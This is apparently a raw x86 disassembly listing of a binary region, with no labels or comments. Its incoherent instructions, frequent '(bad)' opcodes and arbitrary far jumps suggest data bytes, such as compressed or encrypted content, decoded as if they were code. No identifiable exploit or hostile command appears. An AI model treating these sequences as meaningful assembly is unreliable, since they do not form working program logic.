  4238b1:	sbb    al,0xfc
  4238b3:	cdq    
  4238b4:	inc    edi
  4238b5:	xchg   esi,eax
  4238b6:	cdq    
  4238b7:	and    edi,DWORD PTR [eax-0x3f938b1c]
  4238bd:	inc    ebx
  4238be:	jge    0x423898
  4238c0:	dec    edi
  4238c1:	add    dl,0x1c
  4238c4:	pop    edx
  4238c5:	push   es
  4238c6:	fnsave [edi]
  4238c8:	cmp    esi,DWORD PTR [edx]
  4238ca:	out    dx,al
  4238cb:	in     eax,0x49
  4238cd:	mov    bl,0xf3
  4238cf:	arpl   WORD PTR [edi-0x5a],sp
  4238d2:	sbb    al,0x39
  4238d4:	jb     0x42385f
  4238d6:	das    
  4238d7:	xchg   ecx,eax
  4238d8:	adc    BYTE PTR [ebx+0x66894366],dh
  4238de:	out    0x71,al
  4238e0:	push   ss
  4238e1:	or     eax,0x3cb3752a
  4238e6:	mov    BYTE PTR [edi+0x7fc3c677],al
  4238ec:	and    al,0x43
  4238ee:	adc    ch,BYTE PTR [edx]
  4238f0:	bound  esi,QWORD PTR [eax+0x98bf75e]
  4238f6:	sbb    eax,0xb56af680
  4238fb:	mov    BYTE PTR ds:0x1935822e,ch
  423901:	mov    edx,0x696788ea
  423906:	lods   al,BYTE PTR ds:[esi]
  423907:	lock jne 0x42393a
  42390a:	test   DWORD PTR [ebx-0x74],edi
  42390d:	outs   dx,BYTE PTR ds:[esi]
  42390e:	sub    BYTE PTR [ecx-0x5c],ah
  423911:	(bad)  
  423912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423913:	mov    bl,0xe0
  423915:	inc    esp
  423916:	jle    0x4238e3
  423918:	jle    0x423954
  42391a:	lock jb 0x423994
  42391d:	sbb    edx,DWORD PTR [edx]
  42391f:	mov    ch,0x56
  423921:	jno    0x4238fc
  423923:	cmp    bh,ch
  423925:	retf   
  423926:	loope  0x42396d
  423928:	mov    dl,0xc4
  42392a:	mov    eax,0x284f9ee6
  42392f:	into   
  423930:	add    esp,eax
  423932:	jp     0x4238d8
  423934:	pop    esp
  423935:	enter  0xd62,0x61
  423939:	mov    ecx,0x59c2a1ca
  42393e:	in     eax,0xb7
  423940:	jns    0x4239af
  423942:	stos   BYTE PTR es:[edi],al
  423943:	sti    
  423944:	cmp    edi,DWORD PTR [ebx-0xd]
  423947:	fwait
  423948:	scas   al,BYTE PTR es:[edi]
  423949:	nop
  42394a:	scas   al,BYTE PTR es:[edi]
  42394b:	push   0xa303067c
  423950:	adc    DWORD PTR [ebx-0x14],edi
  423953:	test   BYTE PTR [edi],ah
  423955:	lock sbb al,0xfd
  423958:	fcomp  DWORD PTR [edi-0x8ffb746]
  42395e:	cmc    
  42395f:	ja     0x4238f5
  423961:	call   0x232ff7d3
  423966:	pusha  
  423967:	jmp    0xdc84:0x10b3128e
	...
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0xd4fc2bbd
  4239e4:	push   esp
  4239e5:	js     0x423a4e
  4239e7:	jle    0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    dh,bl
  4239ef:	cli    
  4239f0:	ins    DWORD PTR es:[edi],dx
  4239f1:	(bad)  
  4239f2:	stc    
  4239f3:	cmp    dl,BYTE PTR [ecx-0x5d9b1018]
  4239f9:	rcl    BYTE PTR [ecx],cl
  4239fb:	ins    BYTE PTR es:[edi],dx
  4239fc:	int    0x22
  4239fe:	iret   
  4239ff:	adc    edx,DWORD PTR [ecx-0x64e2f729]
  423a05:	jae    0x4239d0
  423a07:	or     ebp,ebp
  423a09:	in     eax,0x42
  423a0b:	push   ebx
  423a0c:	pushf  
  423a0d:	mov    ah,0x40
  423a0f:	fisttp QWORD PTR [eax-0x1e]
  423a12:	and    eax,0x65b6dd0c
  423a17:	sahf   
  423a18:	add    bh,0x90
  423a1b:	sbb    BYTE PTR [eax],bh
  423a1d:	sbb    al,0x65
  423a1f:	je     0x423a6a
  423a21:	mov    ah,0xf7
  423a23:	scas   eax,DWORD PTR es:[edi]
  423a24:	lock test eax,0xf08bcab5
  423a2a:	addr16 mov esp,0x4ca9ba3
  423a30:	sbb    DWORD PTR [esi+eax*2],edi
  423a33:	loop   0x4239cd
  423a35:	retf   0x7753
  423a38:	mov    ds:0x31772033,eax
  423a3d:	and    dh,BYTE PTR [ebx-0xf235e26]
  423a43:	mov    ds:0xf9415ab9,al
  423a48:	push   edx
  423a49:	dec    edx
  423a4a:	fdiv   DWORD PTR [edx-0x4d]
  423a4d:	sub    al,0x5d
  423a4f:	xchg   esp,eax
  423a50:	mov    ecx,es
  423a52:	leave  
  423a53:	mov    al,ds:0x9371b0d8
  423a58:	stos   DWORD PTR es:[edi],eax
  423a59:	dec    esi
  423a5a:	jecxz  0x423aa7
  423a5c:	enter  0xeffc,0x74
  423a60:	repz push edi
  423a62:	push   ebp
  423a63:	stos   BYTE PTR es:[edi],al
  423a64:	jl     0x423a90
  423a66:	(bad)  
  423a67:	iret   
  423a68:	aaa    
  423a69:	in     eax,0x34
  423a6b:	push   0xffffffe6
  423a6d:	ss jmp 0x3e1d101b
  423a73:	retf   0x3084
  423a76:	std    
  423a77:	ja     0x423a3f
  423a79:	std    
  423a7a:	cmp    edx,ebx
  423a7c:	jnp    0x423a97
  423a7e:	sub    DWORD PTR [ebx+0x50fd12e5],edi
  423a84:	imul   BYTE PTR [ebx-0x70]
  423a87:	jno    0x423ae3
  423a89:	fisub  DWORD PTR [esi+0x30]
  423a8c:	jmp    0x423aac
  423a8e:	sbb    DWORD PTR cs:[esi],esi
  423a91:	inc    esp
  423a92:	mov    bh,0xb3
  423a94:	test   BYTE PTR [ebx+eax*2],dh
  423a97:	dec    ebp
  423a98:	mov    dl,0xbf
  423a9a:	aad    0xe0
  423a9c:	pop    ss
  423a9d:	pop    edx
  423a9e:	add    edx,DWORD PTR [edx]
  423aa0:	xchg   esi,eax
  423aa1:	jo     0x423ad9
  423aa3:	pop    ecx
  423aa5:	lock test al,0x28
  423aa8:	inc    esi
  423aa9:	scas   al,BYTE PTR es:[edi]
  423aaa:	fs aad 0x5
  423aad:	mov    cl,0x84
  423aaf:	inc    esi
  423ab0:	pop    esp
  423ab1:	lods   al,BYTE PTR ds:[esi]
  423ab2:	inc    edi
  423ab3:	push   ebp
  423ab4:	xchg   ebp,eax
  423ab5:	mov    dl,0xca
  423ab7:	mov    ecx,0x8845e9db
  423abc:	adc    BYTE PTR [eax-0x5e132c3c],cl
  423ac2:	out    0x1b,eax
  423ac4:	jmp    0x423a63
  423ac6:	jl     0x423a83
  423ac8:	icebp  
  423ac9:	push   ecx
  423aca:	stc    
  423acb:	or     edi,edi
  423acd:	jbe    0x423ab0
  423acf:	jne    0x423aa6
  423ad1:	pushf  
  423ad2:	xor    al,0x61
  423ad4:	sti    
  423ad5:	pusha  
  423ad6:	mov    edi,0xad30668f
  423adb:	dec    ecx
  423adc:	lahf   
  423add:	pop    ecx
  423ade:	lods   eax,DWORD PTR ds:[esi]
  423adf:	adc    esi,DWORD PTR [esi]
  423ae1:	bound  eax,QWORD PTR [eax+0xf]
  423ae4:	xchg   esi,eax
  423ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ae6:	pushf  
  423ae7:	cmp    DWORD PTR [ecx+0x3a],eax
  423aea:	and    al,0x5e
  423aec:	mov    bl,0xc8
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	pop    ds
  423b63:	loope  0x423bda
  423b65:	loopne 0x423bce
  423b67:	jg     0x423b6a
  423b69:	add    BYTE PTR [eax],al
  423b6b:	add    DWORD PTR [eax],eax
  423b6d:	add    BYTE PTR [ebp+0x2f0fe3f2],ch
  423b73:	cwde   
  423b74:	push   0xede97632
  423b79:	repnz gs sbb cl,dh
  423b7d:	mov    BYTE PTR ds:0x1f068fcf,dh
  423b83:	out    dx,al
  423b84:	dec    ebp
  423b85:	stc    
  423b86:	test   BYTE PTR [esi-0x771d1d17],ah
  423b8c:	lds    eax,FWORD PTR [edi-0x1d]
  423b8f:	aaa    
  423b90:	nop
  423b91:	arpl   WORD PTR [ebp-0x41],si
  423b94:	add    al,0x66
  423b96:	sbb    al,0x7f
  423b98:	cmp    BYTE PTR [ebp+0x69e7ee9e],al
  423b9e:	int3   
  423b9f:	cli    
  423ba0:	xor    al,0x65
  423ba2:	xchg   edi,eax
  423ba3:	adc    DWORD PTR [eax-0xabd4f55],edx
  423ba9:	rcl    dl,1
  423bab:	push   ss
  423bac:	outs   dx,BYTE PTR ds:[esi]
  423bad:	lods   al,BYTE PTR ds:[esi]
  423bae:	loop   0x423b57
  423bb0:	xchg   esi,eax
  423bb1:	lods   eax,DWORD PTR ds:[esi]
  423bb2:	retf   
  423bb3:	cs push cs
  423bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bb6:	bound  eax,QWORD PTR [esi]
  423bb8:	loopne 0x423b88
  423bba:	push   ecx
  423bbb:	pop    DWORD PTR [esi-0x4d7026a5]
  423bc1:	push   ebx
  423bc2:	cmp    al,0x59
  423bc4:	jno    0x423be5
  423bc6:	add    BYTE PTR [ecx],al
  423bc8:	mov    edi,0x3ca180cf
  423bcd:	out    dx,eax
  423bce:	jl     0x423ba9
  423bd0:	sbb    eax,0x5f1f18f
  423bd5:	iret   
  423bd6:	mov    bh,0x51
  423bd8:	cmp    BYTE PTR [esi-0x1dad4393],ah
  423bde:	lahf   
  423bdf:	jb     0x423ba3
  423be1:	popa   
  423be2:	sub    ebx,DWORD PTR [edx]
  423be4:	out    dx,eax
  423be5:	ror    DWORD PTR [edx+0xdbf73b2],cl
  423beb:	ror    BYTE PTR [edi+0x26040e9c],0xc7
  423bf2:	pushf  
  423bf3:	mov    gs,WORD PTR [ecx]
  423bf5:	mov    bh,BYTE PTR [ecx-0x1e619dc7]
  423bfb:	inc    edx
  423bfc:	add    DWORD PTR [eax+0x4fd9a9e8],0xffffffb4
  423c03:	leave  
  423c04:	or     BYTE PTR [ebx],bl
  423c06:	(bad)  
  423c07:	mov    eax,ds:0x7444ff8
  423c0c:	pop    edx
  423c0d:	add    al,ah
  423c0f:	daa    
  423c10:	xlat   BYTE PTR ds:[ebx]
  423c11:	mov    BYTE PTR [edi],dh
  423c13:	adc    al,0x6a
  423c15:	pop    ss
  423c16:	xor    DWORD PTR [ecx+0x40],0xffffffd1
  423c1a:	neg    BYTE PTR [ecx+0x2522b975]
  423c20:	pop    esi
  423c21:	add    al,0x31
  423c23:	out    dx,al
  423c24:	scas   al,BYTE PTR es:[edi]
  423c25:	jb     0x423c1c
  423c27:	mov    al,0x57
  423c29:	scas   eax,DWORD PTR es:[edi]
  423c2a:	lahf   
  423c2b:	mov    ah,0xa7
  423c2d:	or     BYTE PTR [edi-0x68011cbe],ch
  423c33:	xchg   edx,eax
  423c34:	mov    esi,0x9344a676
  423c39:	arpl   WORD PTR [ecx+0x29620785],sp
  423c3f:	sti    
  423c40:	ret    
  423c41:	rol    DWORD PTR [eax+0x50],0x9
  423c45:	retf   
  423c46:	ins    BYTE PTR es:[edi],dx
  423c47:	das    
  423c48:	std    
  423c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c4a:	adc    al,0x27
  423c4c:	jbe    0x423cc5
  423c4e:	add    dh,ah
  423c50:	sub    cl,BYTE PTR [ebp+0x280b3a07]
  423c56:	push   edi
  423c57:	jo     0x423bf3
  423c59:	pusha  
  423c5a:	xor    bh,al
  423c5c:	jecxz  0x423ca7
  423c5e:	imul   ecx,DWORD PTR [eax-0x7d],0x36
  423c62:	fsub   QWORD PTR [esi-0x3c3985a9]
  423c68:	dec    BYTE PTR [ecx*1+0xc74243]
	...
  423cd3:	add    BYTE PTR [eax],al
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x65446617]
  423ce3:	push   cs
  423ce4:	rol    BYTE PTR [esi+0x67],cl
  423ce7:	add    BYTE PTR [ecx],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	leave  
  423cef:	and    ah,dh
  423cf1:	lods   al,BYTE PTR ds:[esi]
  423cf2:	pusha  
  423cf3:	in     al,dx
  423cf4:	mov    bh,0x20
  423cf6:	aas    
  423cf7:	hlt    
  423cf8:	pop    ss
  423cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cfa:	or     eax,0x68a54d4f
  423cff:	push   cs
  423d00:	or     DWORD PTR [edi],esp
  423d02:	or     dh,BYTE PTR [ecx+0x3aacddac]
  423d08:	sar    DWORD PTR [ebx],cl
  423d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d0b:	in     al,dx
  423d0c:	mov    edx,0x19694f85
  423d11:	pusha  
  423d12:	lods   eax,DWORD PTR ds:[esi]
  423d13:	(bad)  
  423d14:	scas   al,BYTE PTR es:[edi]
  423d15:	adc    bl,BYTE PTR [ebx]
  423d17:	call   0x77bfd094
  423d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d1d:	xchg   esp,eax
  423d1e:	std    
  423d1f:	push   es
  423d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d21:	mov    dl,0x57
  423d23:	aaa    
  423d24:	xlat   BYTE PTR ds:[ebx]
  423d25:	in     eax,dx
  423d26:	(bad)  
  423d27:	mov    ds:0x6c308de2,al
  423d2c:	push   ebp
  423d2d:	(bad)  
  423d2e:	dec    edi
  423d30:	je     0x423cd9
  423d32:	jne    0x423d27
  423d34:	sbb    dl,al
  423d36:	pusha  
  423d37:	ds cli 
  423d39:	(bad)  
  423d3a:	pop    edx
  423d3b:	jge    0x423d3f
  423d3d:	mov    ecx,0xc7f42afa
  423d42:	or     BYTE PTR [ecx-0x52bf7f26],bh
  423d48:	imul   edx,DWORD PTR [ebx-0x51],0x25172b0
  423d4f:	jo     0x423d3a
  423d51:	imul   edx,DWORD PTR [edx-0x58d2232],0x3a
  423d58:	xchg   ebx,eax
  423d59:	mov    es,esi
  423d5b:	sbb    eax,0xc6e73542
  423d60:	mov    eax,0xbd9d1283
  423d65:	push   0x934ab2dc
  423d6a:	cmp    eax,0xcdf57b6a
  423d6f:	lock fs call 0x22db:0xe19086a
  423d78:	pop    eax
  423d79:	pop    ebp
  423d7a:	or     DWORD PTR [ebp-0x15a7c210],esi
  423d80:	inc    edx
  423d81:	jp     0x423dd1
  423d83:	sbb    eax,0xc308b1f
  423d88:	adc    DWORD PTR [eax-0x45],edi
  423d8b:	cmp    esp,DWORD PTR [eax+0x36aeba3d]
  423d91:	fst    DWORD PTR [edi+0x29]
  423d94:	and    esi,ebp
  423d96:	push   ebp
  423d97:	xor    al,0x94
  423d99:	mov    bl,0xcb
  423d9b:	aaa    
  423d9c:	cdq    
  423d9d:	sub    BYTE PTR ds:0x13b49b05,bh
  423da3:	je     0x423dc2
  423da5:	add    ah,dl
  423da7:	rcl    DWORD PTR [edx],cl
  423da9:	aad    0x7a
  423dab:	test   DWORD PTR [edi-0x1],ebx
  423dae:	popf   
  423daf:	icebp  
  423db0:	jnp    0x423e1e
  423db2:	cs in  eax,0x2c
  423db5:	aaa    
  423db6:	or     al,0xc4
  423db8:	mov    ebp,edx
  423dba:	and    BYTE PTR [ebx+0x2e52b6a3],0x34
  423dc1:	fs loopne 0x423d5a
  423dc4:	out    dx,al
  423dc5:	ret    
  423dc6:	mov    edi,0x542e3595
  423dcb:	imul   eax,DWORD PTR [ecx-0x58016821],0x4a
  423dd2:	xor    BYTE PTR [edx],dh
  423dd4:	popa   
  423dd5:	ss or  bh,al
  423dd8:	into   
  423dd9:	add    bl,dl
  423ddb:	dec    ebx
  423ddc:	or     edi,DWORD PTR [edi]
  423dde:	or     cl,ch
  423de0:	hlt    
  423de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423de2:	test   DWORD PTR gs:[esi-0x15e68c0c],0xfb4261bc
  423ded:	call   0x0:0x0
	...
  423e54:	add    BYTE PTR [eax],al
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax-0x1812a2e],esp
  423e65:	out    0x67,al
  423e67:	add    DWORD PTR [ecx],0x10000
  423e6d:	add    BYTE PTR [edx-0x32],al
  423e70:	inc    edx
  423e71:	stos   BYTE PTR es:[edi],al
  423e72:	mov    ecx,0x5a76ef42
  423e77:	ficomp DWORD PTR [edx-0x5a45fe8b]
  423e7d:	pop    ds
  423e7e:	out    dx,al
  423e7f:	jecxz  0x423e42
  423e81:	inc    edi
  423e82:	xchg   ebx,eax
  423e83:	mov    ds:0xc94f259,eax
  423e88:	ror    ebx,cl
  423e8a:	push   ecx
  423e8b:	loope  0x423e6a
  423e8d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e8f:	in     al,0xdc
  423e91:	std    
  423e92:	or     BYTE PTR [ecx+0xfb51c73],dh
  423e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e99:	in     eax,0x9e
  423e9b:	sbb    BYTE PTR [edx-0x213f04b6],al
  423ea1:	add    esp,DWORD PTR [edx-0x6]
  423ea4:	test   DWORD PTR [edx+0x7ed4932b],esp
  423eaa:	ds jl  0x423e45
  423ead:	out    dx,al
  423eae:	cmp    dl,BYTE PTR [esi+0x45]
  423eb1:	(bad)  
  423eb2:	fcomp  QWORD PTR [esi]
  423eb4:	pop    es
  423eb5:	enter  0x5bbc,0xef
  423eb9:	inc    esp
  423eba:	mov    ah,0xcb
  423ebc:	add    al,0x73
  423ebe:	fisub  WORD PTR [edi+0x54]
  423ec1:	sub    bh,bl
  423ec3:	mov    edx,es
  423ec5:	nop
  423ec6:	sbb    ecx,edi
  423ec8:	es je  0x423efe
  423ecb:	enter  0xf8a3,0x1b
  423ecf:	pop    eax
  423ed0:	retf   
  423ed1:	mov    dh,0x8a
  423ed3:	out    dx,al
  423ed4:	xchg   esp,eax
  423ed5:	mov    dh,0xf6
  423ed7:	jbe    0x423ebe
  423ed9:	add    eax,0xb266a336
  423ede:	imul   ecx,DWORD PTR [ebx],0xce14b48a
  423ee4:	stc    
  423ee5:	ret    0xde96
  423ee8:	ds out 0xc4,al
  423eeb:	(bad)  
  423eec:	(bad)  
  423eed:	loopne 0x423e89
  423eef:	aam    0xa6
  423ef1:	xchg   esi,eax
  423ef2:	push   esi
  423ef3:	lods   eax,DWORD PTR ds:[esi]
  423ef4:	(bad)  
  423ef5:	scas   al,BYTE PTR es:[edi]
  423ef6:	ret    0x31d4
  423ef9:	mov    edi,0xfe1fa8df
  423efe:	call   0xa8a:0xc6bdc64e
  423f05:	mov    edx,0x62df5fec
  423f0a:	jg     0x423f60
  423f0c:	call   0xbf3b0aa8
  423f11:	pop    edx
  423f12:	test   al,0x93
  423f14:	or     al,0x15
  423f16:	out    dx,al
  423f17:	mul    DWORD PTR [esi-0x65be343f]
  423f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f1e:	mov    DWORD PTR [edx+0x6847dbc9],0xef9bc28
  423f28:	dec    eax
  423f29:	sub    DWORD PTR [edi+0x3a],0x9e4bd098
  423f30:	mov    DWORD PTR [esp+eax*4],ecx
  423f33:	xor    eax,0x28e1c765
  423f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f39:	mov    edx,0xf064d4a2
  423f3e:	(bad)  
  423f40:	mov    eax,ds:0x22be64a7
  423f45:	jae    0x423f77
  423f47:	jno    0x423f65
  423f49:	add    DWORD PTR [ebp-0x2cc341be],esi
  423f4f:	jg     0x423f00
  423f51:	adc    esp,DWORD PTR [ebp+0x5e6a7546]
  423f57:	dec    ecx
  423f58:	xchg   esp,eax
  423f59:	mov    ch,0x44
  423f5b:	mov    dh,0xe1
  423f5d:	outs   dx,BYTE PTR ds:[esi]
  423f5e:	push   ss
  423f5f:	jmp    0x6ec3:0xf617a4ea
  423f66:	add    ecx,esi
  423f68:	retf   
  423f69:	add    bl,BYTE PTR [eax+0xd9fbe2]
	...
  423fd3:	add    BYTE PTR [eax],al
  423fd5:	add    BYTE PTR [esi+0x74b9649a],ch
  423fdb:	(bad)  
  423fdc:	call   FWORD PTR [edi-0x26e369ec]
  423fe2:	sbb    eax,0x6713634a
  423fe7:	add    BYTE PTR [ecx],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	xor    cl,BYTE PTR [ecx+edx*8-0x6795510b]
  423ff5:	fwait
  423ff6:	rcl    BYTE PTR [esi-0x4b],0x3a
  423ffa:	pop    es
  423ffb:	and    dh,BYTE PTR [edx+ebx*4-0x19]
  423fff:	daa    
  424000:	cdq    
  424001:	mov    ecx,0x1172479c
  424006:	enter  0x1008,0xa8
  42400a:	ins    DWORD PTR es:[edi],dx
  42400b:	aas    
  42400c:	jmp    0x65ba1a86
  424011:	bound  esp,QWORD PTR [edx+0x5c]
  424014:	pusha  
  424015:	in     eax,0x64
  424017:	nop
  424018:	aas    
  424019:	js     0x423fd1
  42401b:	cli    
  42401c:	pop    ebp
  42401d:	mov    bh,0x41
  42401f:	xchg   esp,eax
  424020:	pop    eax
  424021:	inc    ebp
  424022:	push   esi
  424023:	cld    
  424024:	xchg   esi,eax
  424025:	jnp    0x423faf
  424027:	dec    esp
  424028:	aad    0x49
  42402a:	lea    ebp,[esi+0x7c]
  42402d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42402e:	cld    
  42402f:	cli    
  424030:	push   cs
  424031:	xchg   ebp,eax
  424032:	fmul   DWORD PTR [ebx+esi*1-0x2db6bd81]
  424039:	arpl   ax,si
  42403b:	add    ebx,edx
  42403d:	inc    edx
  42403e:	jecxz  0x423fe3
  424040:	cdq    
  424041:	pop    esi
  424042:	jbe    0x424010
  424044:	dec    ebx
  424045:	add    DWORD PTR [esp+eax*2],ebx
  424048:	adc    DWORD PTR [ecx+eax*1-0x9],ebp
  42404c:	pop    ecx
  42404d:	ret    
  42404e:	pop    ebp
  42404f:	pusha  
  424050:	pop    esp
  424051:	cdq    
  424052:	jmp    DWORD PTR [edx]
  424054:	or     al,0xca
  424056:	retf   0x40f6
  424059:	stos   DWORD PTR es:[edi],eax
  42405a:	jae    0x424026
  42405c:	jmp    0x8827:0xbe5c2c27
  424063:	push   cs
  424064:	das    
  424065:	out    dx,al
  424066:	outs   dx,BYTE PTR ds:[esi]
  424067:	scas   eax,DWORD PTR es:[edi]
  424068:	mov    ah,0x3c
  42406a:	xchg   edi,eax
  42406b:	jecxz  0x42400f
  42406d:	test   al,0xac
  42406f:	mov    esp,0xdc3f7283
  424074:	pop    esp
  424075:	inc    edi
  424076:	int3   
  424077:	inc    edx
  424078:	jns    0x42405e
  42407a:	or     ebp,ecx
  42407c:	aaa    
  42407d:	mov    ch,0x36
  42407f:	push   es
  424080:	jns    0x4240f0
  424082:	lods   eax,DWORD PTR ds:[esi]
  424083:	imul   esi,DWORD PTR [ebx],0x51e6ffb9
  424089:	lahf   
  42408a:	mov    al,BYTE PTR [esi+0x66]
  42408d:	jns    0x4240fa
  42408f:	adc    ecx,DWORD PTR [eax]
  424091:	outs   dx,BYTE PTR ds:[esi]
  424092:	push   esi
  424093:	xlat   BYTE PTR ds:[ebx]
  424094:	out    0x75,al
  424096:	lock add eax,0x339fb22f
  42409c:	push   ss
  42409d:	fs inc esp
  42409f:	arpl   WORD PTR [ebp+0x73c885e7],di
  4240a5:	add    ecx,esi
  4240a7:	pop    ecx
  4240a8:	sti    
  4240a9:	sbb    dh,BYTE PTR [ebp-0x306e62c1]
  4240af:	or     al,0x13
  4240b1:	push   esi
  4240b2:	loopne 0x424088
  4240b4:	stos   BYTE PTR es:[edi],al
  4240b5:	out    dx,eax
  4240b6:	mov    WORD PTR [esi],es
  4240b8:	jmp    0x4240ce
  4240ba:	dec    edx
  4240bb:	or     DWORD PTR [edi+0x31],0x19
  4240bf:	lock sub BYTE PTR [ecx+0x9209218],dl
  4240c6:	es cmp edi,0xc73be071
  4240cd:	daa    
  4240ce:	test   eax,0x7f91084f
  4240d3:	dec    edx
  4240d4:	fs test al,0x26
  4240d7:	and    DWORD PTR ss:[esi-0x5aec2cb5],edi
  4240de:	sub    BYTE PTR [edx],bh
  4240e0:	jae    0x42406e
  4240e2:	jmp    0x42408b
  4240e4:	adc    DWORD PTR [ebp+0x4c],0x2b9e4e88
  4240eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240ec:	pushf  
  4240ed:	xchg   edx,eax
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	sub    BYTE PTR [eax+ebx*8],bh
  424165:	lods   al,BYTE PTR ds:[esi]
  424166:	add    DWORD PTR [bx+di],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	sbb    eax,0x694b65b0
  424173:	js     0x424167
  424175:	nop
  424176:	mov    ah,0x81
  424178:	xor    esp,ecx
  42417a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42417b:	sar    DWORD PTR [edi-0x59fd77bf],1
  424181:	iret   
  424182:	rcl    esp,1
  424184:	adc    al,0x1d
  424186:	cs ret 
  424188:	mov    edi,0x453f9bc1
  42418d:	out    0xd2,eax
  42418f:	dec    eax
  424190:	adc    eax,0xc37fa119
  424195:	(bad)  
  424196:	arpl   WORD PTR [eax],si
  424198:	push   eax
  424199:	or     eax,0xc034723
  42419e:	mov    eax,0x9b1e6819
  4241a3:	outs   dx,BYTE PTR ds:[esi]
  4241a4:	imul   edx,DWORD PTR [ecx],0x212163da
  4241aa:	loopne 0x4241a8
  4241ac:	mov    ah,0xf
  4241ae:	mov    al,0x3b
  4241b0:	inc    ebx
  4241b1:	sub    eax,0x7a335fb4
  4241b6:	jne    0x4241d7
  4241b8:	cmp    BYTE PTR [edx+0x78],0x81
  4241bc:	clc    
  4241bd:	sub    BYTE PTR [edx+0x24],ah
  4241c0:	mov    eax,?
  4241c2:	xchg   ebx,eax
  4241c3:	mov    al,bl
  4241c5:	push   eax
  4241c6:	sbb    DWORD PTR [eax],0x53
  4241c9:	cmp    al,0x8a
  4241cb:	stos   DWORD PTR es:[edi],eax
  4241cc:	mov    al,0xee
  4241ce:	cmp    eax,0xa176ecca
  4241d3:	leave  
  4241d4:	cs inc esp
  4241d6:	dec    ebp
  4241d7:	mov    bh,0x8
  4241d9:	or     DWORD PTR [edi+0x6796f5f0],esi
  4241df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241e0:	retf   
  4241e1:	enter  0x997c,0x18
  4241e5:	mov    al,0x7d
  4241e7:	dec    edx
  4241e8:	hlt    
  4241e9:	jle    0x4241e6
  4241eb:	cmp    al,0x75
  4241ed:	enter  0x7864,0xa4
  4241f1:	sub    eax,DWORD PTR [edx-0x73c498c9]
  4241f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241f8:	push   cs
  4241f9:	or     ebp,edi
  4241fb:	ret    0x8a27
  4241fe:	in     eax,dx
  4241ff:	loope  0x4241f1
  424201:	xchg   DWORD PTR [eax],ecx
  424203:	fucomp st(3)
  424205:	loope  0x4241d9
  424207:	inc    ebx
  424208:	es jecxz 0x4241b4
  42420b:	jns    0x424212
  42420d:	cld    
  42420e:	mov    al,0x33
  424210:	jb     0x424227
  424212:	(bad)
  424216:	rol    DWORD PTR [ebx-0x69],0x17
  42421a:	xchg   esp,eax
  42421b:	not    BYTE PTR [ebp+0x42]
  42421e:	loop   0x424261
  424220:	or     eax,0x970c2f10
  424225:	lss    ecx,FWORD PTR [esi*2-0x4d18a635]
  42422d:	in     al,0xd
  42422f:	mov    BYTE PTR [eax-0x4d100b43],al
  424235:	loop   0x4241c1
  424237:	sbb    DWORD PTR [ebx-0x55],eax
  42423a:	xor    DWORD PTR [ebx-0xb63c538],ebp
  424240:	mov    ds:0x5d061b99,al
  424245:	and    dh,ch
  424247:	imul   ebp,DWORD PTR [edi],0x47df8a20
  42424d:	dec    ebx
  42424e:	fsub   DWORD PTR [ebx]
  424250:	jp     0x4241fc
  424252:	mov    ebp,0x13e68f23
  424257:	xchg   ebx,eax
  424258:	pop    edi
  424259:	imul   esp,DWORD PTR [esi],0xfffffff3
  42425c:	outs   dx,DWORD PTR ds:[esi]
  42425d:	es push esi
  42425f:	cmp    ebp,DWORD PTR [ebp-0x3a]
  424262:	cmc    
  424263:	stos   DWORD PTR es:[edi],eax
  424264:	pop    eax
  424265:	jl     0x424286
  424267:	adc    ch,ch
  424269:	add    esp,DWORD PTR [ebx]
  42426b:	fsub   QWORD PTR [ebx+ebp*1+0x0]
	...
  4242d3:	add    BYTE PTR [eax],al
  4242d5:	add    BYTE PTR [edi-0x4c275c4c],al
  4242db:	(bad)  
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	dec    eax
  4242e3:	call   0x84a9c920
  4242e8:	add    DWORD PTR [eax],eax
  4242ea:	add    BYTE PTR [ecx],al
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	pop    edi
  4242ef:	clc    
  4242f0:	stos   BYTE PTR es:[edi],al
  4242f1:	sub    eax,0x20a67a5a
  4242f6:	cmp    DWORD PTR [ebx],esp
  4242f8:	stos   BYTE PTR es:[edi],al
